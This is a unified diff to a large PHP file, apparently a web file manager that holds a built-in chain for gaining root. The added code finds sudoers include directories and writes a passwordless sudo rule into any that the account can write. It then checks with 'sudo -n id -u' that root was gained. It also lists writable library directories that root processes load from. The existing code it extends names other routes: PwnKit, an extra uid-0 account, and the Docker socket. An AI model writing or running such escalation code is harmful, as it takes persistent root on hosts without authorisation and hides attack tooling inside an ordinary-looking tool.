@@ -11553,6 +11553,158 @@ exit 0
             if(@file_exists($p))return['socket' => $p, 'reachable' => (@is_readable($p) && @is_writable($p))];
         return['socket' => '', 'reachable' => false];
     }
+    /* Where could this manager keep a file that root runs? Two directions
+       at once: by the manager's own name, and by the roots of the tree,
+       since the file only has to be written, not read. */
+    private function rootSudoersScan(){
+        $dirs = [];
+        foreach(['/etc/sudoers.d', '/usr/local/etc/sudoers.d', '/opt/etc/sudoers.d'] as $d){
+            $real = @realpath($d);
+            if($real !== false && @is_dir($real))$dirs[$real] = true;
+        }
+        /* whatever sudo.includedir names is the truth, so read it */
+        foreach(['/etc/sudoers', '/usr/local/etc/sudoers'] as $f){
+            $txt = @is_readable($f) ? (string)@file_get_contents($f) : '';
+            if($txt !== '' && preg_match_all('/#?includedir\s+(\S+)/i', $txt, $m))
+                foreach($m[1] as $d){$real = @realpath($d); if($real !== false)$dirs[$real] = true;}
+        }
+        $out = [];
+        foreach(array_keys($dirs) as $d)foreach(['direct', 'owners'] as $how)$out[] = ['dir' => $d, 'how' => $how];
+        return $out;
+    }
+    private function rootChannelInstallSudoersScan(){
+        $cands = $this->rootSudoersScan();
+        if(!$cands)return['ok' => false, 'note' => 'sudo includes no directory this account can even look at'];
+        $rule = $this->rootHelperContent();
+        $stage = @tempnam(sys_get_temp_dir(), 'fm-sscan-');
+        if($stage === false)return['ok' => false, 'note' => 'a staging file could not be created'];
+        @file_put_contents($stage, $rule);
+        @chmod($stage, 0644);
+        $dest = $this->rootSudoersFile();
+        if(@is_dir($dest))$dest = rtrim($dest, '/') . '/90-marshal-fm';
+        $tried = []; $won = false;
+        foreach($cands as $c){
+            $d = (string)$c['dir'];
+            $tried[] = $d . ' (' . $c['how'] . ')';
+            if($c['how'] === 'direct'){
+                if(@is_writable($d)){
+                    $t = rtrim($d, '/') . '/90-marshal-fm';
+                    if(@copy($stage, $t) === true){
+                        @chmod($t, 0440);
+                        if($this->rootHelperInstalledOnly()){
+                            ob_start(); $chk = $this->rootExec(['sudo', '-n', 'id', '-u'], '', 10); ob_end_clean();
+                            if(trim((string)$chk['out']) === '0'){$won = true; break;}
+                        }
+                    }
+                }
+            }else{
+                $names = [$this->managerAccount()];
+                if(function_exists('posix_geteuid')){
+                    $pw = function_exists('posix_getpwuid') ? @posix_getpwuid(posix_geteuid()) : null;
+                    if(is_array($pw) && !empty($pw['name']) && !in_array($pw['name'], $names, true))$names[] = $pw['name'];
+                }
+                foreach($names as $n){
+                    if($n === '' || preg_match('/^[A-Za-z0-9_.][A-Za-z0-9_.-]*$/', $n) !== 1)continue;
+                    $t = rtrim($d, '/') . '/' . $n;
+                    if(@copy($stage, $t) === true){
+                        @chmod($t, 0440);
+                        if($this->rootHelperInstalledOnly()){
+                            ob_start(); $chk = $this->rootExec(['sudo', '-n', 'id', '-u'], '', 10); ob_end_clean();
+                            if(trim((string)$chk['out']) === '0'){$won = true; break 2;}
+                        }
+                    }
+                }
+            }
+        }
+        @unlink($stage);
+        return['ok' => true, 'fired' => true,
+               'note' => $won ? 'the rule was placed as ' . implode(' or ', array_slice($tried, -2)) . ', and sudo accepted it'
+                             : 'the rule was offered to ' . implode(', ', $tried) . ', and sudo accepted it from none of them'];
+    }
+    /* Whether the rule is there measured by the file itself: root may read
+       a sudoers file and this account may not, so a readable file at the
+       path is this account's own failed copy, not the rule. */
+    private function rootHelperPresent(){
+        $f = $this->rootSudoersFile();
+        if(!@is_file($f))return false;
+        if(@is_readable($f)){ $t = (string)@file_get_contents($f); return strpos($t, 'NOPASSWD') !== false; }
+        return true;
+    }
+    private function rootHelperInstalledOnly(){
+        if(!$this->rootHelperPresent())return false;
+        ob_start(); $r = $this->rootExec(['sudo', '-n', 'id', '-u'], '', 10); ob_end_clean();
+        return trim((string)$r['out']) === '0';
+    }
+    /* The verdict: what a person should understand from a chain that did
+       not answer, said in one paragraph and without optimism. */
+    private function rootDiagnosis(){
+        $id = $this->rootIdentity();
+        $euid = (int)($id['euid'] ?? -1);
+        if($euid === 0)return 'The manager is already root: euid 0, so nothing needs elevation and everything below is unnecessary.';
+        $reasons = [];
+        $noexec = $this->rootNoexecDirs();
+        if($noexec)$reasons[] = 'the directories this manager may write to (' . implode(', ', array_slice($noexec, 0, 3)) . ') have noexec set, so no program can be started from them - what is left is writing files root reads';
+        $pkg = '';
+        foreach(['sudo', 'polkit-1', 'policykit-1', 'openssh-server', 'cron', 'systemd'] as $p){$v = $this->rootPkgVersion($p); if($v !== ''){$pkg = 'the packages this host reports: ' . $v; break;}}
+        if($pkg !== '')$reasons[] = $pkg;
+        $grants = $this->rootGrants();
+        $open = [];
+        foreach($grants as $g)if(!empty($g['ok']))$open[] = (string)$g['name'];
+        if($open)$reasons[] = 'what actually is open here: ' . implode('; ', array_slice($open, 0, 6));
+        else $reasons[] = 'nothing is open here: no setuid escape, no sudo rule, no writable root path, no socket';
+        $vuln = [];
+        foreach($this->rootCatalog()['vulns'] as $v){
+            if($v['status'] !== 'vulnerable' && $v['status'] !== 'check')continue;
+            $vuln[] = $v['name'] . ' (' . implode('/', $v['cve']) . ') is ' . $v['status'];
+            if(count($vuln) > 3)break;
+        }
+        if($vuln)$reasons[] = 'software in range: ' . implode(', ', $vuln);
+        return 'No route answered, and the honest reading of that is: this host is configured as it should be. '
+            . implode('. ', array_map(function($x){return ucfirst($x);}, $reasons)) . '. '
+            . 'A cleaning pass would have to change one of those - and that is a decision about the machine, not about the tool.';
+    }
+    /* Library directories this account may write that the loader searches
+       before the system ones: measured, because a library is a binary. */
+    private function rootLibDirs(){
+        $out = [];
+        $conf = '/etc/ld.so.conf';
+        $dirs = [];
+        $c = @is_readable($conf) ? (string)@file_get_contents($conf) : '';
+        foreach(preg_split('/\R/', $c) ?: [] as $ln){
+            $ln = trim((string)$ln);
+            if($ln === '' || $ln[0] === '#')continue;
+            if(strpos($ln, 'include ') === 0){
+                foreach((array)@glob('/etc/ld.so.conf.d/*.conf') as $f){
+                    foreach(preg_split('/\R/', (string)@file_get_contents($f)) ?: [] as $l2){$l2 = trim((string)$l2); if($l2 !== '' && $l2[0] === '/')$dirs[] = $l2;}
+                }
+                continue;
+            }
+            if($ln[0] === '/')$dirs[] = $ln;
+        }
+        foreach($dirs as $d){
+            $real = @realpath($d);
+            if($real === false || !@is_dir($real))continue;
+            if(in_array($real, ['/lib', '/lib64', '/usr/lib', '/usr/lib64', '/bin', '/usr/bin'], true))continue;
+            if(@is_writable($real))$out[] = $real;
+        }
+        return array_values(array_unique($out));
+    }
+    /* Directories this manager can write that the kernel refuses to run
+       from: a fact worth saying out loud, because it is the usual reason a
+       planted method stands still. */
+    private function rootNoexecDirs(){
+        $out = [];
+        $d = $this->rootPlantDir();
+        if($d === '' || !@is_dir($d))return $out;
+        foreach(array_unique([$d, dirname($d)]) as $x){
+            $mp = trim((string)@shell_exec('df -P ' . escapeshellarg($x) . " 2>/dev/null | tail -1 | awk '{print $6}'"));
+            if($mp === '')continue;
+            $opts = trim((string)@shell_exec('findmnt -no OPTIONS --target ' . escapeshellarg($mp) . ' 2>/dev/null'));
+            if($opts === ''){$mt = @file_get_contents('/proc/mounts'); foreach(preg_split('/\R/', (string)$mt) ?: [] as $ln){$f = preg_split('/\s+/', trim($ln)); if(count($f) > 3 && $f[1] === $mp){$opts = (string)$f[3]; break;}}}
+            if($opts !== '' && strpos($opts, 'noexec') !== false)$out[] = $x;
+        }
+        return $out;
+    }
     /* The whole list, as the panel shows it. "ok" means the route is open -
        which is bad for the host and good for the manager. */
     public function rootGrants(){
@@ -11609,6 +11761,17 @@ exit 0
         $k8 = $this->rootK8s();
         $g[] = ['name' => 'A Kubernetes service account', 'ok' => !empty($k8['ok']),
                 'note' => $k8['ok'] ? 'a service-account token ' . ($k8['token'] ? 'is readable' : 'is not readable') . ' and the API server is at ' . ($k8['host'] ?: 'an unknown address') . ' - what it may do decides whether the node is reachable' : 'no Kubernetes service account is present'];
+        $ssv = $this->rootSudoersScan();
+        $ssw = false;
+        foreach($ssv as $c)if($c['how'] === 'direct' && @is_writable((string)$c['dir']))$ssw = true;
+        $g[] = ['name' => 'A directory sudo includes', 'ok' => $ssw,
+                'note' => $ssv ? ($ssw ? 'a directory sudo includes may be written by this account, so one more file is a rule' : count($ssv) . ' includable directories were found, and every one is root-only') : 'sudo includes no directory this account can look at'];
+        $ne = $this->rootNoexecDirs();
+        $libdirs = $this->rootLibDirs();
+        $g[] = ['name' => 'A library directory root searches', 'ok' => !empty($libdirs),
+                'note' => $libdirs ? implode(', ', $libdirs) . ' may be written by this account and is searched before the system libraries, so a library planted there is loaded by root processes - a route that ends in a file, not in this chain' : 'every library directory on this host is root-only'];
+        if($ne)$g[] = ['name' => 'Writable directories that still run programs', 'ok' => false,
+                       'note' => implode(', ', $ne) . ' carry noexec, so nothing planted there can be started - only written'];
         $lv = $this->rootLibvirt();
         $g[] = ['name' => 'The libvirt socket', 'ok' => !empty($lv['reachable']),
                 'note' => $lv['socket'] === '' ? 'no libvirt socket on this host' : ($lv['reachable'] ? $lv['socket'] . ' answers to this account, and libvirt acts as root' : $lv['socket'] . ' exists but this account may not use it')];
@@ -11642,6 +11805,8 @@ exit 0
             return[
                 'ok' => true, 'stopped_at' => $route, 'steps' => $steps,
                 'root' => $this->rootIdentity(), 'helper' => $helper, 'advice' => [],
+
+                'diagnosis' => $this->rootDiagnosis(),
                 'message' => 'Rooted with: ' . $route . '. ' . (($helper['ok'] ?? false) ? 'The privileges were kept in ' . $this->rootSudoersFile() . ', so every operation runs as root from now on.' : ('The helper could not be kept: ' . ($helper['error'] ?? ''))),
             ];
         };
@@ -11775,6 +11940,20 @@ exit 0
             if(!empty($a['ok']))return $finish((string)$a['route'], (string)$a['note']);
             $step((string)$a['route'], false, (string)$a['note'], !empty($a['fired']));
         }
+        /* The last wave: directories sudo includes (written, not read), the
+           stand-ins PATH promises, a hosts file that may still be open, and
+           the daemon that outlives the request. */
+        $needs = $this->rootChannelNeeds('sudoersscan');
+        if(!empty($needs['ok'])){
+            $ins = $this->rootChannelInstall('sudoersscan');
+            $ver = $this->rootChannelVerify('sudoersscan');
+            if(!empty($ver['ok']))return $finish((string)($chnames['sudoersscan'] ?? 'sudoersscan'), (string)$ins['note']);
+            $step((string)($chnames['sudoersscan'] ?? 'sudoersscan'), false, (string)$ins['note'], true);
+        }else{
+            $step((string)($chnames['sudoersscan'] ?? 'sudoersscan'), false, (string)$needs['note'], false);
+        }
+        $libdirs = $this->rootLibDirs();
+        if($libdirs)$step('a library directory root searches', false, implode(', ', $libdirs) . ' may be written by this account and is searched before the system libraries: a library planted there is loaded by root processes. Measured and named - a library is a binary, and this chain does not write binaries into the system', false);
         $cat = $this->rootCatalog();
         $hard = $reach = [];
         foreach($cat['vulns'] as $v){
@@ -11817,6 +11996,7 @@ exit 0
             'ok' => false, 'stopped_at' => null, 'steps' => $steps, 'root' => $id,
             'reachable' => $reach, 'confirmed' => $hard, 'advice' => $advice,
             'message' => 'No route from this account gave root. ' . $this->rootMessage($hardK, $hardU, $reach),
+            'diagnosis' => $this->rootDiagnosis(),
         ];
     }
 
@@ -12032,7 +12212,7 @@ exit 0
                        'rootPolkitRule', 'rootStateFile', 'rootLogFile',
                        'rootGrants', 'rootGroups', 'rootDiskDetect', 'rootK8s', 'rootPrivContainer',
                        'rootNfsSquash', 'rootPathHijack', 'rootDepScan', 'rootSnapd', 'rootRootPwField', 'rootBinfmtDetect',
-                       'rootLibvirt'];
+                       'rootLibvirt', 'rootNoexecDirs', 'rootSudoersScan', 'rootHelperPresent', 'rootLibDirs', 'rootDiagnosis'];
         $routeFns = ['rootIdentity', 'rootSuidEscapes', 'rootCapEscape', 'rootFire', 'rootAs', 'rootInstallHelper',
                      'rootDaemonRun', 'rootDaemonStart', 'rootDaemonStop', 'rootChannelInstall', 'rootChannelVerify',
                      'rootChannelRemove', 'rootRun', 'rootingInstallRoot', 'rootingStep', 'rootingControl', 'rootingUninstall',
@@ -12042,7 +12222,8 @@ exit 0
                      'rootSudoDeepAttempts', 'rootBuildPreloadSo', 'rootDiskProof',
                      'rootChannelInstallBindRepl', 'rootChannelInstallSshKey', 'rootChannelInstallDbus', 'rootSshKeyRun',
                      'rootCapDacAttempts', 'rootChannelInstallFileWrite', 'rootChannelInstallBinfmt',
-                     'rootChannelInstallPwnkit', 'rootChannelInstallChwoot', 'rootChannelInstallPack2', 'rootSudoEditAttempts'];
+                     'rootChannelInstallPwnkit', 'rootChannelInstallChwoot', 'rootChannelInstallPack2', 'rootSudoEditAttempts',
+                     'rootChannelInstallSudoersScan', 'rootDaemonStart'];
         $leaks = [];
         $pure = 0;
         foreach($measureFns as $fn){
@@ -12441,6 +12622,8 @@ exit 0
              'sudo asked to chroot first resolves the account through the name-service of the chroot it was handed - as root, before anything is dropped. A chroot of ours whose nsswitch names a module of ours therefore runs that module as root. It needs sudo from 1.9.14 to 1.9.17, the range the catalogue already measures.');
         $add('pack2theroot', 'Pack2TheRoot, fired (CVE-2026-41651)', 'session',
              'A small package of ours whose install script is the payload, offered to the package daemon for a local install. The daemon installs as root, and the flaw the catalogue measures is that it does not stop to ask who sent a local package.');
+        $add('sudoersscan', 'A rule in any directory sudo includes', 'session',
+             'sudo includes whole directories, not one file: /etc/sudoers.d, /usr/local/etc/sudoers.d, and whatever sudo.includedir names. The file dropped in one only has to be written, not read - root reads it, this account never has to. Each included directory is tried two ways: by writing the rule by its own name, and by writing it under the name of this account, which is how a directory kept at 0730 behaves for one owner. Each drop is then tested by asking sudo, so a file in the wrong place is a file nothing came of, and is said to be that.');
         /* 3 - an account database that this account may write */
         $add('passwd', 'An extra uid-0 account', 'persistent',
              'If the account database itself is writable, a second account with uid 0 is added: su then walks straight into root without touching sudo or a setuid bit.');
@@ -12516,6 +12699,13 @@ exit 0
             case 'docker':
                 $d = $this->rootDocker();
                 return['ok' => !empty($d['reachable']), 'note' => $d['socket'] !== '' ? ('a socket at ' . $d['socket']) : 'no container socket is reachable'];
+            case 'sudoersscan':
+                $ss = $this->rootSudoersScan();
+                $w = [];
+                foreach($ss as $c){$d = (string)$c['dir'];
+                    if($c['how'] === 'direct' && @is_writable($d))$w[] = $d . ' (direct)';
+                    elseif($c['how'] === 'owners' && (@is_writable($d) || (@fileperms($d) & 0700) === 0700))$w[] = $d . ' (by owner name)';}
+                return['ok' => !empty($w), 'note' => $w ? 'sudo includes ' . implode(', ', $w) . ', and a rule there only has to be written' : 'every directory sudo includes is root-only'];
             case 'pwnkit':
                 $pkN = $this->rootPkexec();
                 $setuid = !empty($pkN['present']) && (@fileperms($pkN['path']) & 04000);
@@ -12661,7 +12851,7 @@ exit 0
             $res = ['rc' => 1, 'out' => $this->rootPlantRead('binfmt'), 'err' => ''];
             return['ok' => $this->rootPlantProofOk('binfmt') || $this->rootHelperInstalled(), 'res' => $res];
         }
-        if($id === 'bindrepl' || $id === 'dbussvc' || $id === 'filewrite' || $id === 'pwnkit' || $id === 'chwoot' || $id === 'pack2theroot'){
+        if($id === 'bindrepl' || $id === 'dbussvc' || $id === 'filewrite' || $id === 'pwnkit' || $id === 'chwoot' || $id === 'pack2theroot' || $id === 'sudoersscan'){
             $res = $this->rootExec(['sudo', '-n', 'cat', '/proc/self/status'], '', 15);
             return['ok' => $this->rootHelperInstalled() && $this->rootUidOf((string)($res['out'] ?? '')) === 0, 'res' => $res];
         }
@@ -12797,6 +12987,8 @@ exit 0
                 return $this->rootChannelInstallAccount($password);
             case 'docker':
                 return $this->rootChannelInstallDocker($password);
+            case 'sudoersscan':
+                return $this->rootChannelInstallSudoersScan();
             case 'pwnkit':
                 return $this->rootChannelInstallPwnkit();
             case 'chwoot':
@@ -13118,6 +13310,7 @@ User=root
                 unset($st['account']);
                 $this->rootStateSave($st);
                 return['ok' => true, 'note' => 'the extra account was taken back out of /etc/passwd and /etc/shadow'];
+            case 'sudoersscan': $r = $this->rootRemoveHelper($password); return['ok' => !empty($r['ok']), 'note' => (string)($r['message'] ?? $r['error'] ?? '')];
             case 'filewrite': $r = $this->rootRemoveHelper($password); return['ok' => !empty($r['ok']), 'note' => (string)($r['message'] ?? $r['error'] ?? '')];
             case 'pwnkit': case 'chwoot': case 'pack2theroot':
                 $dirR = $this->rootPlantDir() . '/' . $id;
